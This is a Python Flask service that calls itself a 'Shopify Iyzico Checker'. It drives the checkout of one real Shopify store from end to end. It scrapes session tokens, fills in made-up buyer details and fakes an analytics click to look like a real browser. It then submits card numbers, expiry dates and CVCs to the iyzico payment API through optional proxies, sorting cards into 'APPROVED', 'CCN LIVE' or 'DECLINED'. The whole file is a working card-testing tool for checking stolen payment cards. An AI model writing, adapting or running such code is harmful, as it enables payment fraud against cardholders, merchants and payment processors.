import os
import re
import json
import time
import uuid
import random
import requests
import urllib3
from flask import Flask, request, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
app = Flask(__name__)

class IyzicoChecker:
    def __init__(self):
        self.cookies = {}
        self.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36'
        self.baseUrl = 'https://phlabturkiye.com'
        self.shopifyClientId = ''
        self.cartToken = ''
        self.checkoutUrl = ''
        self.sessionToken = ''
        self.queueToken = ''
        self.attemptToken = ''
        self.stableId = ''
        self.signedHandle = ''
        self.iyziToken = ''
        self.iyziSessionId = ''
        self.iyziCookie = ''
        
        # Variable untuk JSON response
        self.currency = 'TRY'
        self.price = 469.0
        self.startTime = 0
        self.usedProxy = ''

    def setProxy(self, proxy):
        self.usedProxy = proxy
        if proxy:
            self.proxy = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
        else:
            self.proxy = {}

    def generateUUID(self):
        return str(uuid.uuid4())

    def req(self, url, method='GET', headers=None, postData=None, extraCookies=None):
        if headers is None: headers = []
        
        headers_dict = {}
        for h in headers:
            parts = h.split(': ', 1)
            if len(parts) == 2:
                headers_dict[parts[0]] = parts[1]

        cookieStr = ''
        for k, v in self.cookies.items():
            cookieStr += f"{k}={v}; "
        if extraCookies:
            cookieStr += extraCookies
        if cookieStr:
            headers_dict['Cookie'] = cookieStr.rstrip('; ')

        try:
            if method == 'POST':
                r = requests.post(url, headers=headers_dict, data=postData, proxies=self.proxy, timeout=45, allow_redirects=False, verify=False)
            else:
                r = requests.get(url, headers=headers_dict, proxies=self.proxy, timeout=45, allow_redirects=False, verify=False)
            
            for c in r.cookies:
                self.cookies[c.name] = c.value

            location = r.headers.get('Location', '')
            return {'status': r.status_code, 'headers': str(r.headers), 'body': r.text, 'redirect': location}
        except Exception as e:
            return {'status': 0, 'headers': '', 'body': str(e), 'redirect': ''}

    # Step 1: Add to cart
    def addToCart(self):
        url = self.baseUrl + '/cart/add.js'
        headers = [
            'accept: */*',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/json',
            'origin: ' + self.baseUrl,
            'priority: u=1, i',
            'referer: ' + self.baseUrl + '/products/kojiso%E2%84%A2-temizleme-bari',
            'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: ' + self.userAgent,
        ]

        self.shopifyClientId = self.generateUUID()
        self.cookies['localization'] = 'TR'
        self.cookies['_shopify_y'] = self.generateUUID()
        self.cookies['_shopify_s'] = self.generateUUID()
        self.cookies['shopify_client_id'] = self.shopifyClientId

        postData = json.dumps({
            'items': [{'id': 49413933367586, 'quantity': 1, 'properties': {}}]
        })

        result = self.req(url, 'POST', headers, postData)
        print(f"[Step 1] Add to cart: HTTP {result['status']}")

        if result['status'] != 200:
            return False

        try:
            data = json.loads(result['body'])
        except:
            print("[Step 1] Failed to parse response")
            return False

        if 'cart' in self.cookies:
            self.cartToken = requests.utils.unquote(self.cookies['cart'])
            qPos = self.cartToken.find('?')
            if qPos != -1:
                self.cartToken = self.cartToken[:qPos]

        print(f"[Step 1] Cart token: {self.cartToken}")
        return True

    # Step 2: Get checkout page
    def getCheckout(self):
        if not self.cartToken:
            url = self.baseUrl + '/checkout'
        else:
            url = self.baseUrl + '/checkouts/cn/' + self.cartToken + '/tr-tr'

        headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: en-US,en;q=0.9',
            'priority: u=0, i',
            'referer: ' + self.baseUrl + '/products/kojiso%E2%84%A2-temizleme-bari',
            'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: same-origin',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: ' + self.userAgent,
        ]

        maxRedirects = 5
        currentUrl = url
        body = ''
        status = 0

        for i in range(maxRedirects):
            result = self.req(currentUrl, 'GET', headers)
            status = result['status']
            body = result['body']

            if 300 <= status < 400 and result['redirect']:
                redirect = result['redirect']
                if not redirect.startswith('http'):
                    redirect = self.baseUrl + redirect
                currentUrl = redirect
                self.checkoutUrl = currentUrl
                continue
            break

        print(f"[Step 2] Checkout page: HTTP {status}")

        if status != 200 or not body:
            print("[Step 2] Failed to load checkout")
            return False

        self.checkoutUrl = currentUrl

        m = re.search(r'sessionToken["\s:]+["\'](AAE[A-Za-z0-9_\-+=\/]+)["\']', body)
        if m: self.sessionToken = m.group(1)

        m = re.search(r'queueToken["\s:]+["\'](Ax[A-Za-z0-9_\-+=\/]+)["\']', body)
        if m: self.queueToken = m.group(1)

        m = re.search(r'attemptToken["\s:]+["\']([\w\-]+)["\']', body)
        if m: 
            self.attemptToken = m.group(1)
        else: 
            self.attemptToken = self.cartToken + '-' + str(hash(time.time()))[:16]

        m = re.search(r'stableId["\s:]+["\']([\w\-]+)["\']', body)
        if m: 
            self.stableId = m.group(1)
        else: 
            self.stableId = self.generateUUID()

        m = re.search(r'signedHandle["\s:]+["\']([\w\+\/=\-]+)["\']', body)
        if m: self.signedHandle = m.group(1)

        m = re.search(r'checkouts\/cn\/([\w]+)', self.checkoutUrl)
        if m: self.cartToken = m.group(1)

        print(f"[Step 2] Session token: {self.sessionToken[:40] if self.sessionToken else 'None'}...")
        print(f"[Step 2] Cart token: {self.cartToken}")

        return True

    # Step 3: Submit for completion (GraphQL)
    def submitForCompletion(self, email, firstName, lastName, phone):
        url = self.baseUrl + '/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion'

        headers = [
            'accept: application/json',
            'accept-language: tr-TR',
            'content-type: application/json',
            'origin: ' + self.baseUrl,
            'priority: u=1, i',
            'referer: ' + self.checkoutUrl,
            'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'shopify-checkout-client: checkout-web/1.0',
            'shopify-checkout-source: id="' + self.cartToken + '", type="cn"',
            'user-agent: ' + self.userAgent,
            'x-checkout-one-session-token: ' + self.sessionToken,
            'x-checkout-web-build-id: f2ebb8978752bcfad85c28a708877d9082499349',
            'x-checkout-web-deploy-stage: production',
            'x-checkout-web-server-handling: fast',
            'x-checkout-web-server-rendering: yes',
            'x-checkout-web-source-id: ' + self.cartToken,
        ]

        address = {
            'address1': 'dogkkdmdf',
            'city': 'İSTANBUL',
            'countryCode': 'TR',
            'firstName': firstName,
            'lastName': lastName,
            'phone': phone,
        }

        input_data = {
            'sessionInput': {'sessionToken': self.sessionToken},
            'queueToken': self.queueToken or 'Axpn1k41cyum8f-hOiMOFANKERyquhRmF9N9gvscLQem1Y7x3LVw-i6SDHWsNASwbSWJpTd48nQHrsliDSESikeFIEfKnvEDF1tKsnskB_o2pqb1g6j_iNnh4IhYUvsI93JpRmjxzA15LBw=',
            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
            'delivery': {
                'deliveryLines': [{
                    'destination': {'streetAddress': address},
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyByHandle': {
                            'handle': 'ba5eae04f72fa075fafa5d02fe76a7b9-ae29b6b82cd53e4966aaa0d41946eae0',
                            'customDeliveryRate': False,
                        },
                        'options': {},
                    },
                    'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]},
                    'deliveryMethodTypes': ['SHIPPING'],
                    'expectedTotalPrice': {'value': {'amount': '0.00', 'currencyCode': 'TRY'}},
                    'destinationChanged': False,
                }],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
                'supportsSplitShipping': True,
            },
            'deliveryExpectations': {
                'deliveryExpectationLines': [{'signedHandle': self.signedHandle}] if self.signedHandle else []
            },
            'merchandise': {
                'merchandiseLines': [{
                    'stableId': self.stableId,
                    'merchandise': {
                        'productVariantReference': {
                            'id': 'gid://shopify/ProductVariantMerchandise/49413933367586',
                            'variantId': 'gid://shopify/ProductVariant/49413933367586',
                            'properties': [],
                            'sellingPlanId': None,
                            'sellingPlanDigest': None,
                        },
                    },
                    'quantity': {'items': {'value': 1}},
                    'expectedTotalPrice': {'value': {'amount': '469.00', 'currencyCode': 'TRY'}},
                    'lineComponentsSource': None,
                    'lineComponents': [],
                }],
            },
            'memberships': {'memberships': []},
            'payment': {
                'totalAmount': {'any': True},
                'paymentLines': [{
                    'paymentMethod': {
                        'directPaymentMethod': None,
                        'giftCardPaymentMethod': None,
                        'redeemablePaymentMethod': None,
                        'walletPaymentMethod': None,
                        'walletsPlatformPaymentMethod': None,
                        'localPaymentMethod': None,
                        'paymentOnDeliveryMethod': None,
                        'paymentOnDeliveryMethod2': None,
                        'manualPaymentMethod': None,
                        'customPaymentMethod': None,
                        'offsitePaymentMethod': {
                            'name': 'iyzico - Kredi ve Banka Kartları',
                            'paymentMethodIdentifier': '0b9b116d56e4115db6dd6d489111b44e',
                            'billingAddress': {'streetAddress': address},
                        },
                        'customOnsitePaymentMethod': None,
                        'deferredPaymentMethod': None,
                        'customerCreditCardPaymentMethod': None,
                        'paypalBillingAgreementPaymentMethod': None,
                        'remotePaymentInstrument': None,
                    },
                    'amount': {'value': {'amount': '469', 'currencyCode': 'TRY'}},
                }],
                'billingAddress': {'streetAddress': address},
            },
            'buyerIdentity': {
                'customer': {'presentmentCurrency': 'TRY', 'countryCode': 'TR'},
                'email': email,
                'emailChanged': False,
                'phoneCountryCode': 'TR',
                'marketingConsent': [{'email': {'consentState': 'GRANTED', 'value': email}}],
                'shopPayOptInPhone': {'number': phone, 'countryCode': 'TR'},
                'rememberMe': False,
            },
            'tip': {'tipLines': []},
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': None,
                'proposedTotalIncludedAmount': {'value': {'amount': '78.17', 'currencyCode': 'TRY'}},
                'proposedMixedStateTotalAmount': None,
                'proposedExemptions': [],
            },
            'note': {
                'message': None,
                'customAttributes': [
                    {'key': 'il-adi', 'value': 'İSTANBUL'},
                    {'key': 'İlçe', 'value': ''},
                    {'key': 'Mahalle', 'value': ''},
                ],
            },
            'localizationExtension': {'fields': []},
            'nonNegotiableTerms': None,
            'scriptFingerprint': {
                'signature': None,
                'signatureUuid': None,
                'lineItemScriptChanges': [],
                'paymentScriptChanges': [],
                'shippingScriptChanges': [],
            },
            'optionalDuties': {'buyerRefusesDuties': False},
            'cartMetafields': [],
        }

        body = json.dumps({
            'variables': {
                'input': input_data,
                'attemptToken': self.attemptToken,
                'metafields': [],
                'analytics': {
                    'requestUrl': self.checkoutUrl,
                    'pageId': self.generateUUID().upper(),
                },
            },
            'operationName': 'SubmitForCompletion',
            'id': 'b6047b61264c44776db6b89cce9be9f2b646e9226af0681d7e7a0af7c1321293',
        })

        result = self.req(url, 'POST', headers, body)
        print(f"[Step 3] SubmitForCompletion: HTTP {result['status']}")

        try:
            data = json.loads(result['body'])
        except:
            data = {}

        if data:
            submitResult = data.get('data', {}).get('submitForCompletion')
            if submitResult:
                print(f"[Step 3] Keys: {', '.join(submitResult.keys())}")

                action = submitResult.get('action')
                if action:
                    rUrl = action.get('redirectUrl') or action.get('url')
                    if rUrl:
                        print(f"[Step 3] Action redirect: {rUrl}")
                        m = re.search(r'retrieve\/([a-f0-9\-]+)', rUrl, re.I)
                        if m: self.iyziSessionId = m.group(1)
                        return rUrl

                receipt = submitResult.get('receipt')
                if receipt:
                    po = receipt.get('purchaseOrder')
                    if po:
                        print(f"[Step 3] PO keys: {', '.join(po.keys())}")
                        if 'sessionToken' in po:
                            self.sessionToken = po['sessionToken']
                            print("[Step 3] New session token acquired")
                        if 'actions' in po:
                            for a in po['actions']:
                                rUrl = a.get('redirectUrl') or a.get('url')
                                if rUrl and 'iyzipay' in rUrl:
                                    print(f"[Step 3] PO action redirect: {rUrl}")
                                    m = re.search(r'retrieve\/([a-f0-9\-]+)', rUrl, re.I)
                                    if m: self.iyziSessionId = m.group(1)
                                    return rUrl
                        if 'nextAction' in po:
                            rUrl = po['nextAction'].get('redirectUrl') or po['nextAction'].get('url')
                            if rUrl:
                                print(f"[Step 3] nextAction: {rUrl}")
                                return rUrl

            if 'errors' in data:
                print(f"[Step 3] Errors: {json.dumps(data['errors'])}")

        m = re.search(r'iyzipay\.com[^"\']*retrieve\/([a-f0-9\-]+)', result['body'], re.I)
        if m:
            self.iyziSessionId = m.group(1)
            return 'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/' + self.iyziSessionId

        if self.sessionToken:
            print("[Step 3] No redirect, polling processing page...")
            return self.pollForRedirect()

        print(f"[Step 3] Response: {result['body'][:1500]}")
        return None

    # Step 3.5: Processing page'den iyzico redirect al
    def pollForRedirect(self):
        import time as t
        processingUrl = self.baseUrl + '/checkouts/cn/' + self.cartToken + '/processing'

        headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'referer: ' + self.checkoutUrl,
            'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: same-origin',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: ' + self.userAgent,
        ]

        for attempt in range(5):
            if attempt > 0: t.sleep(2)

            currentUrl = processingUrl
            for r in range(8):
                result = self.req(currentUrl, 'GET', headers)
                print(f"[Step 3.5] Poll #{attempt}: HTTP {result['status']} → {currentUrl[:80]}")

                if 300 <= result['status'] < 400 and result['redirect']:
                    rUrl = result['redirect']
                    if 'iyzipay' in rUrl or 'iyzico' in rUrl:
                        print(f"[Step 3.5] iyzico redirect found: {rUrl}")
                        m = re.search(r'retrieve\/([a-f0-9\-]+)', rUrl, re.I)
                        if m: self.iyziSessionId = m.group(1)
                        return rUrl
                    if not rUrl.startswith('http'):
                        rUrl = self.baseUrl + rUrl
                    currentUrl = rUrl
                    continue

                if result['status'] == 200:
                    body = result['body']
                    m = re.search(r'https?:\/\/[^"\']*iyzipay\.com[^"\']*retrieve\/([a-f0-9\-]+)', body, re.I)
                    if m:
                        self.iyziSessionId = m.group(1)
                        foundUrl = 'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/' + self.iyziSessionId
                        print(f"[Step 3.5] Found iyzico URL in body: {foundUrl}")
                        return foundUrl
                    m = re.search(r'(?:url|href|location)[=\s"\']+\s*(https?:\/\/[^"\'>\s]+iyzipay[^"\'>\s]*)', body, re.I)
                    if m:
                        print(f"[Step 3.5] Found redirect in HTML: {m.group(1)}")
                        m2 = re.search(r'retrieve\/([a-f0-9\-]+)', m.group(1), re.I)
                        if m2: self.iyziSessionId = m2.group(1)
                        return m.group(1)
                break

        return self.pollGraphQL()

    # GraphQL PollForCompletion
    def pollGraphQL(self):
        import time as t
        url = self.baseUrl + '/checkouts/internal/graphql/persisted?operationName=PollForCompletion'

        headers = [
            'accept: application/json',
            'accept-language: tr-TR',
            'content-type: application/json',
            'origin: ' + self.baseUrl,
            'referer: ' + self.baseUrl + '/checkouts/cn/' + self.cartToken + '/processing',
            'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'shopify-checkout-client: checkout-web/1.0',
            'shopify-checkout-source: id="' + self.cartToken + '", type="cn"',
            'user-agent: ' + self.userAgent,
            'x-checkout-one-session-token: ' + self.sessionToken,
            'x-checkout-web-source-id: ' + self.cartToken,
        ]

        for attempt in range(6):
            if attempt > 0: t.sleep(2)

            postData = json.dumps({
                'variables': {'sessionInput': {'sessionToken': self.sessionToken}},
                'operationName': 'PollForCompletion',
                'id': 'e74e161b1a3c357b11599aa29e498040923e4f27cd90dd3e7cc74a3a5bfbfb5e',
            })

            result = self.req(url, 'POST', headers, postData)
            print(f"[Step 3.5 GQL] Poll #{attempt}: HTTP {result['status']}")

            try:
                data = json.loads(result['body'])
            except:
                continue

            poll = data.get('data', {}).get('poll') or data.get('data', {}).get('pollForCompletion')
            if not poll:
                bodyStr = result['body']
                m = re.search(r'iyzipay\.com[^"\']*retrieve\/([a-f0-9\-]+)', bodyStr, re.I)
                if m:
                    self.iyziSessionId = m.group(1)
                    return 'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/' + self.iyziSessionId
                m = re.search(r'"redirectUrl"\s*:\s*"(https?:[^"]+)"', bodyStr, re.I)
                if m:
                    rUrl = m.group(1).replace('\\"', '"')
                    print(f"[Step 3.5 GQL] redirectUrl found: {rUrl}")
                    m2 = re.search(r'retrieve\/([a-f0-9\-]+)', rUrl, re.I)
                    if m2: self.iyziSessionId = m2.group(1)
                    return rUrl
                print(f"[Step 3.5 GQL] Response: {bodyStr[:800]}")
                continue

            status = poll.get('status', '')
            if status == 'PROCESSING':
                print("[Step 3.5 GQL] Still processing...")
                continue

            action = poll.get('action')
            if action:
                rUrl = action.get('redirectUrl') or action.get('url')
                if rUrl:
                    print(f"[Step 3.5 GQL] Redirect: {rUrl}")
                    m = re.search(r'retrieve\/([a-f0-9\-]+)', rUrl, re.I)
                    if m: self.iyziSessionId = m.group(1)
                    return rUrl

        print("[Step 3.5] Failed to get iyzico redirect")
        return None

    # Step 4: Get iyzico payment page
    def getIyzicoPage(self, iyziUrl):
        headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: cross-site',
            'upgrade-insecure-requests: 1',
            'user-agent: ' + self.userAgent,
        ]

        currentUrl = iyziUrl
        body = ''
        status = 0

        for i in range(5):
            result = self.req(currentUrl, 'GET', headers)
            status = result['status']
            body = result['body']

            if 300 <= status < 400 and result['redirect']:
                currentUrl = result['redirect']
                continue
            break

        print(f"[Step 4] iyzico page: HTTP {status}")

        if not body: return False

        m = re.search(r'iyziToken["\s:=]+["\']([\w\-]+)["\']', body)
        if m: 
            self.iyziToken = m.group(1)
        else:
            m = re.search(r'token["\s:=]+["\']([\w\-]{36})["\']', body)
            if m: self.iyziToken = m.group(1)

        if 'iyzi' in self.cookies:
            self.iyziCookie = self.cookies['iyzi']

        if not self.iyziSessionId:
            m = re.search(r'retrieve\/([a-f0-9\-]+)', currentUrl, re.I)
            if m: self.iyziSessionId = m.group(1)

        print(f"[Step 4] IYZI Token: {self.iyziToken}")
        print(f"[Step 4] Session ID: {self.iyziSessionId}")

        return True

    # Step 5: Countly analytics
    def sendCountly(self):
        url = 'https://countly.iyzico.com/i'

        ts = int(time.time() * 1000)
        deviceId = self.generateUUID()

        events = [
            {
                'key': '[CLY]_action',
                'count': 1,
                'segmentation': {
                    'type': 'click',
                    'x': 664,
                    'y': 817,
                    'width': 923,
                    'height': 683,
                    'view': '/v2/shopify/payment/checkout/retrieve/' + self.iyziSessionId,
                    'domain': 'api.iyzipay.com',
                },
                'timestamp': ts,
                'hour': int(time.strftime('%H')),
                'dow': int(time.strftime('%w')),
                'id': str(random.randint(10000000, 99999999)) + str(ts),
                'cvid': str(hash(ts)) + str(ts),
            },
        ]

        postData = 'events=' + json.dumps(events) + '&app_key=de7016e9b70331f97215d5c37f6e0ced6f14b152&device_id=' + deviceId + '&sdk_name=javascript_native_web&sdk_version=24.4.0&t=1&av=0.0&metrics=' + json.dumps({'_ua': self.userAgent}) + '&timestamp=' + str(ts) + '&hour=' + str(int(time.strftime('%H'))) + '&dow=' + str(int(time.strftime('%w'))) + '&rr=1'

        headers = [
            'accept: */*',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://api.iyzipay.com',
            'priority: u=1, i',
            'referer: https://api.iyzipay.com/',
            'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: cross-site',
            'user-agent: ' + self.userAgent,
        ]

        result = self.req(url, 'POST', headers, postData)
        print(f"[Step 5] Countly: HTTP {result['status']}")
        return True

    # Step 6: iyzico card payment
    def submitCard(self, cc, mm, yy, cvv, holderName):
        url = 'https://api.iyzipay.com/payment/iyzipos/checkoutform/auth/ecom'

        iyziCookieStr = ''
        if self.iyziCookie:
            iyziCookieStr = 'iyzi=' + self.iyziCookie

        headers = [
            'Accept: application/json',
            'Accept-Language: en-US,en;q=0.9',
            'Connection: keep-alive',
            'Content-Type: application/json',
            'Origin: https://api.iyzipay.com',
            'Referer: https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/' + self.iyziSessionId,
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: same-origin',
            'User-Agent: ' + self.userAgent,
            'X-IYZI-TOKEN: ' + self.iyziToken,
            'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
        ]

        postData = json.dumps({
            'installment': 1,
            'paidPrice': 469,
            'paymentChannel': 'WEB',
            'paymentCard': {
                'cardNumber': cc,
                'cardHolderName': holderName,
                'expireYear': yy,
                'expireMonth': mm,
                'cvc': cvv,
                'registerConsumerCard': False,
                'registerCard': 0,
            },
            'browserFingerprint': {
                'language': 'tr',
                'timezone': -180,
                'hasSessionStorage': True,
                'hasLocalStorage': True,
                'hasIndexedDb': True,
                'hasOpenDb': True,
                'platform': 'false',
                'hasLiedLanguage': False,
                'hasLiedResolution': False,
                'hasLiedOS': False,
                'hasLiedBrowser': False,
                'maxTouchPoints': 0,
                'touchEventSuccess': False,
                'hasTouchStart': False,
                'fingerprintHash': '',
            },
            'pwiMetadata': {
                'lightRedesign': ['false'],
                'pwiGrowthActionDisabled': ['false'],
            },
        })

        result = self.req(url, 'POST', headers, postData, iyziCookieStr)
        print(f"[Step 6] iyzico Auth: HTTP {result['status']}")
        print(f"[Step 6] Response: {result['body']}")

        return {'status': result['status'], 'body': result['body']}

    # Function check asal kau (dari PHP)
    def check(self, card_input, proxy=''):
        self.startTime = time.time()
        self.setProxy(proxy)

        parts = card_input.split('|')
        if len(parts) != 4:
            return self.buildResp(card_input, "ERROR", False, "Invalid format (CC|MM|YY|CVC)")

        cc = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        card_full = f"{cc}|{mm}|{yy}|{cvv}"

        email = 'user' + str(random.randint(1000, 9999)) + '@gmail.com'
        firstName = 'Mehmet'
        lastName = 'Yilmaz'
        phone = '5' + str(random.randint(300000000, 599999999))
        holderName = f"{firstName} {lastName}"

        if not self.addToCart():
            return self.buildResp(card_full, "ERROR", False, "Cart failed")

        if not self.getCheckout():
            return self.buildResp(card_full, "ERROR", False, "Checkout failed")

        iyziUrl = self.submitForCompletion(email, firstName, lastName, phone)
        if not iyziUrl:
            return self.buildResp(card_full, "ERROR", False, "Submit failed")

        if not self.getIyzicoPage(iyziUrl):
            return self.buildResp(card_full, "ERROR", False, "iyzico page failed")

        if not self.iyziToken:
            return self.buildResp(card_full, "ERROR", False, "No iyzico token")

        self.sendCountly()

        result = self.submitCard(cc, mm, yy, cvv, holderName)
        try:
            data = json.loads(result['body'])
        except:
            return self.buildResp(card_full, "ERROR", False, f"HTTP {result['status']}")

        if data:
            status = data.get('status', '')
            errorCode = data.get('errorCode', '')
            errorMessage = data.get('errorMessage', '')
            paymentStatus = data.get('paymentStatus', '')

            if status == 'success' or paymentStatus == 'SUCCESS':
                return self.buildResp(card_full, "APPROVED", True, errorMessage)
            elif status == 'failure':
                if '10051' in errorCode or 'bakiye' in errorMessage or 'insufficient' in errorMessage:
                    return self.buildResp(card_full, "CCN LIVE", True, f"CCN LIVE ({errorMessage})")
                return self.buildResp(card_full, "CARD_DECLINED", False, f"[{errorCode}] {errorMessage}")

            return self.buildResp(card_full, "CARD_DECLINED", False, f"[{errorCode}] {errorMessage}")

        return self.buildResp(card_full, "ERROR", False, f"HTTP {result['status']}")

    # Wrapper untuk JSON response format yang kau minta
    def buildResp(self, cc, responseCode, status, msg):
        elapsed = round(time.time() - self.startTime, 2)
        return {
            "Currency": self.currency,
            "Gateway": "Shopify Payments",
            "Price": self.price,
            "Proxy": "Live" if self.usedProxy else "Direct",
            "Response": msg if msg else responseCode,
            "Status": status,
            "Time": f"{elapsed}s",
            "cc": cc
        }


# ==========================================
# RAILWAY API ROUTER
# ==========================================

@app.route('/shopify')
def shopify_route():
    cc = request.args.get('cc', '')
    proxy = request.args.get('proxy', '')

    if not cc:
        return jsonify({"error": "Missing CC parameter", "usage": "?cc=CC|MM|YY|CVC&proxy=ip:port (optional)"}), 400

    checker = IyzicoChecker()
    return jsonify(checker.check(cc, proxy))

@app.route('/')
def index_route():
    return jsonify({
        "service": "Shopify Iyzico Checker",
        "endpoint": "/shopify",
        "note": "Hardcoded to phlabturkiye.com based on original script",
        "example": "/shopify?cc=4111111111111111|01|28|123"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
